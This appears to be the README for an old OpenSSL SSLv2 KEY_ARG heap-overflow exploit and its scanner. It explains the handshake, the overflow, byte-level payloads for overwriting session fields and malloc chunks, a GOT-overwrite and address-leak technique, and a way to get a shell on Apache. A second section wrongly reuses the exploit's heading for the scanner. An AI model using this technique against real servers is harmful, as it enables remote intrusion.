---------[ ./openssl-too-open ]

openssl-too-open is a remote exploit for the KEY_ARG overflow in
OpenSSL 0.9.6d and older. It will give you a remote shell with the
priviledges of the server process (nobody when used against Apache,
root against other servers).

Only Linux/x86 targets are supported.

---------[ How Does openssl-too-open Work? ]

It is important to understand the SSL2 handshake in order to successfully
exploit the KEY_ARG vulnerability.

---/ Typical SSL2 Handshake


        Client           Server

     CLIENT_HELLO -->

                  <-- SERVER_HELLO

CLIENT_MASTER_KEY -->

                  <-- SERVER_VERIFY

  CLIENT_FINISHED -->

                  <-- SERVER_FINISHED

The CLIENT_HELLO message contains a list of the ciphers the client supports,
a session id and some challenge data. The session id is used if the client
wishes to reuse an already established session, otherwise it's empty.

The server replies with a SERVER_HELLO message, also listing all supported
ciphers and includes a certificate with its public RSA key. The server
also sends a connection id, which will later be used by the client to
verify that the encryption works.

The client generates a random master key, encrypts it with the server's
public key and sends it with a CLIENT_MASTER_KEY message. This message
also specifies the cipher selected by the client and a KEY_ARG field,
which meaning depends on the specified cipher. For DES-CBC ciphers, the
KEY_ARG contains the initialization vector.

Now both the client and the server have the master key and they can generate
the session keys from it. All messages from this point on are encrypted.

The server replies with a SERVER_VERIFY message, containing the challenge
data from the CLIENT_HELLO message. If the key exchange has been successful,
the client will be able to decrypt this message and the challenge data returned
from the server will match the challenge data sent by the client.

The client sends a CLIENT_FINISHED message with a copy of the connection id
from the SERVER_HELLO packet. It is now the server's turn to decrypt this
message and check if the connection id returned by the client matches the
connection it sent by the server.

Finally the server sends a SERVER_FINISHED message, completing the handshake.
This message contains a session id, generated by the server. If the client
wishes to reuse the session later, it can send this session id with the
CLIENT_HELLO message.


---/ The KEY_ARG Buffer Overflow

The bug is in ssl/s2_srvr.c, in the get_client_master_key() function. This
function reads a CLIENT_MASTER_KEY packet and processes it. It reads the
KEY_ARG_LENGTH value from the client and then copies that many bytes in an
array of a fixed size.  This array is part of the SSL_SESSION structure.
If the client specifies a KEY_ARG longer than 8 bytes, the variables in the
SSL_SESSION structure can be overwritten with user supplied data.

Let's look at the definition of this structure.

typedef struct ssl_session_st
    {
    int ssl_version;    /* what ssl version session info is
                 * being kept in here? */

    /* only really used in SSLv2 */
    unsigned int key_arg_length;
    unsigned char key_arg[SSL_MAX_KEY_ARG_LENGTH];
    int master_key_length;
    unsigned char master_key[SSL_MAX_MASTER_KEY_LENGTH];
    /* session_id - valid? */
    unsigned int session_id_length;
    unsigned char session_id[SSL_MAX_SSL_SESSION_ID_LENGTH];
    /* this is used to determine whether the session is being reused in
     * the appropriate context. It is up to the application to set this,
     * via SSL_new */
    unsigned int sid_ctx_length;
    unsigned char sid_ctx[SSL_MAX_SID_CTX_LENGTH];

    int not_resumable;

    /* The cert is the certificate used to establish this connection */
    struct sess_cert_st /* SESS_CERT */ *sess_cert;

    /* This is the cert for the other end.
     * On clients, it will be the same as sess_cert->peer_key->x509
     * (the latter is not enough as sess_cert is not retained
     * in the external representation of sessions, see ssl_asn1.c). */
    X509 *peer;
    /* when app_verify_callback accepts a session where the peer's certificate
     * is not ok, we must remember the error for session reuse: */
    long verify_result; /* only for servers */

    int references;
    long timeout;
    long time;

    int compress_meth;      /* Need to lookup the method */

    SSL_CIPHER *cipher;
    unsigned long cipher_id;    /* when ASN.1 loaded, this
                     * needs to be used to load
                     * the 'cipher' structure */

    STACK_OF(SSL_CIPHER) *ciphers; /* shared ciphers? */

    CRYPTO_EX_DATA ex_data; /* application specific data */

    /* These are used to make removal of session-ids more
     * efficient and to implement a maximum cache size. */
    struct ssl_session_st *prev,*next;
    } SSL_SESSION;

It really looks better with VIM coloring. Anyway, we know the size of the
structure and it's allocated on the heap. The first thing that comes to
mind is to overwrite the next malloc chunk and then make the OpenSSL code
call free() on the SSL_SESSION structure.

After we send a CLIENT_MASTER_KEY message, we'll read a SERVER_VERIFY packet
from the server and then we'll respond with a CLIENT_FINISHED message.
The server uses this the contents of this message to verify that the
key exchange succeeded. If we return a wrong connection id, the server
will abort the connection and free the SSL_SESSION structure, which is
exactly what we want.

We'll overwrite the KEY_ARG array with 8 random bytes and the following
string:

unsigned char overwrite_next_chunk[] =
    "AAAA"                              /* int master_key_length; */
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  /* unsigned char master_key[SSL_MAX_MASTER_KEY_LENGTH]; */
    "AAAA"                              /* unsigned int session_id_length; */
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  /* unsigned char session_id[SSL_MAX_SSL_SESSION_ID_LENGTH]; */
    "AAAA"                              /* unsigned int sid_ctx_length; */
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  /* unsigned char sid_ctx[SSL_MAX_SID_CTX_LENGTH]; */
    "AAAA"                              /* unsigned int sid_ctx_length; */
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  /* unsigned char sid_ctx[SSL_MAX_SID_CTX_LENGTH]; */
    "AAAA"                              /* int not_resumable; */
    "\x00\x00\x00\x00"                  /* struct sess_cert_st *sess_cert; */
    "\x00\x00\x00\x00"                  /* X509 *peer; */
    "AAAA"                              /* long verify_result; */
    "\x01\x00\x00\x00"                  /* int references; */
    "AAAA"                              /* int timeout; */
    "AAAA"                              /* int time */
    "AAAA"                              /* int compress_meth; */
    "\x00\x00\x00\x00"                  /* SSL_CIPHER *cipher; */
    "AAAA"                              /* unsigned long cipher_id; */
    "\x00\x00\x00\x00"                  /* STACK_OF(SSL_CIPHER) *ciphers; */
    "\x00\x00\x00\x00\x00\x00\x00\x00"  /* CRYPTO_EX_DATA ex_data; */
    "AAAAAAAA"                          /* struct ssl_session_st *prev,*next; */
    "\x00\x00\x00\x00"                  /* Size of previous chunk */
    "\x11\x00\x00\x00"                  /* Size of chunk, in bytes */
    "fdfd"                              /* Forward and back pointers */
    "bkbk"
    "\x10\x00\x00\x00"                  /* Size of previous chunk */
    "\x10\x00\x00\x00"                  /* Size of chunk, PREV_INUSE is set */

The "A" bytes don't affect the OpenSSL control flow. The other bytes must be
set to specific values to make the exploit work. For example, the peer and
sess_cert pointers must be NULL, because the SSL cleanup code will call
free() on them before it frees the SSL_SESSION structure.

The free() call will write the value of the bk pointer to the memory
address in the fd pointer + 12 bytes. We'll put our shellcode address
in the bk pointer and we'll write it to the free() entry in the GOT
table.

If you don't understand how freeing this malloc chunk overwrites the GOT
entry or don't know what the GOT table is, visit juliano's site at
http://community.core-sdi.com/~juliano/ and read some papers.


---/ Getting the Shellcode Address

There is only one little problem. We need a place to put our shellcode
and we need the exact shellcode address. The trick is to use the
SERVER_FINISHED message. This message includes the session id, which
is read from the SSL_SESSION structure. The server reads session_id_length
bytes from the session_id[] array and sends them to the client. We can
overwrite the session_id_length variable and complete the handshake.
If session_id_length is long enough, the SERVER_FINISHED message will
include the contents of the SSL_SESSION structure.

To get the contents of the session structure, we'll overwrite the
KEY_ARG array with 8 random bytes and the following string:

unsigned char overwrite_session_id_length[] =
    "AAAA"                              /* int master_key_length; */
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  /* unsigned char master_key[SSL_MAX_MASTER_KEY_LENGTH]; */
    "\x70\x00\x00\x00";                 /* unsigned int session_id_length; */

Now let's imagine the heap state when we send our connection request.
We have a heap, which contains some allocated chunks of memory and a
large 'top' chunk, covering all free memory.

When the server receives the connection, it forks a child and the child
allocates the SSL_SESSION structure. If there has not been a signifficant
malloc/free activity, the fragmentation of the memory will be low and the
new chunk will be allocated from the beginning of the 'top' chunk.

The next allocated chunk is a 16 bytes chunk which holds a
STACK_OF(SSL_CIPHER) structure. This chunk is also allocated from the
beginning of the 'top' chunk, so it's located right above the SSL_SESSION
structure. The address of this chunk is stored in the session->ciphers
variable.

If we're lucky, the memory would look like this:

                    | top chunk |
                    |-----------|
session->ciphers    |  16 bytes |  <- STACK_OF(SSL_CIPHER) structure
points here      -> |-----------|
                    | 368 bytes |  <- SSL_SESSION structure
                    |-----------|

We can read the session->ciphers pointer from the SSL_SESSION structure
in the SERVER_FINISHED message. By subtracting 368 from it, we'll get
the address of the SSL_SESSION structure, and thus the address of
the data we've overwritten.


---/ fork() Is Your Friend

We'll use the same buffer overflow to get the address of the shellcode
and to overwrite the malloc chunks. The problem is that we need to
know the shellcode address before we send it to the server.

The only solution is to send 2 requests. The first request overwrites
session_id_length and we complete the handshake to get the SERVER_FINISHED
message. Then we adjust our shellcode and open a second connection
which we use to send it.

If we're dealing with a forking server like Apache, the two children
will have an identical memory layout and malloc() will put the
session structure at the same address. Of course, life is never that
simple. Apache children can handle multiple requests, which would
change the memory allocation pattern of the two children we use.

To guarantee that both children are freshly spawned, our exploit
will open a number of connections to the server before sending the
two important requests. These connection should use up all available
Apache children and force new ones to be spawned.

If the server traffic is high, the exploit might fail. If the
memory allocation patterns are different, the exploit might fail.
If you have a wrong GOT address, the exploit will definitely fail.


---------[ How Does openssl-too-open Work? ]

openssl-scanner overflows the master_key_length, master_key[] and session_id_length
variables in the SSL_SESSION structure. The first two are uninitialized at this point,
so overwriting them has no effect on openssl. The first place where the session_id_length
variable is used after we overwrite it is in session_finish() (ssl/s2_srvr.c:847)

memcpy(p,s->session->session_id, (unsigned int)s->session->session_id_length);

This data is returned in the SERVER_FINISHED packet. openssl-scanner checks the length
of the data. If it matches the value we set session_id_length to, then the server is
exploitable.

OpenSSL 0.9.6e and higher versions return
192.160.0.2: Server error: SSL2_PE_UNDEFINED_ERROR (0x00) after KEY_ARG data was sent. Server is not vulnerable.

The updates that most vendors have put out backport the changes from 0.9.6e to 0.9.6b
or some other version of OpenSSL. They don't return an error like 0.9.6e.
The updated RedHat and Debian packages) would close the connection immediatelly
after they receive the oversized KEY_ARG data, causing openssl-scanner to report

192.168.0.1: Connection closed after KEY_ARG data was sent. Server is most likely not vulnerable.

IIS servers exhibit the same behavior.

IIS servers that don't have a certificate set up close the connection as soon as
they receive the CLIENT_HELLO packet. openssl-scanner reports this as

192.168.0.2: Connection unexpectedly closed
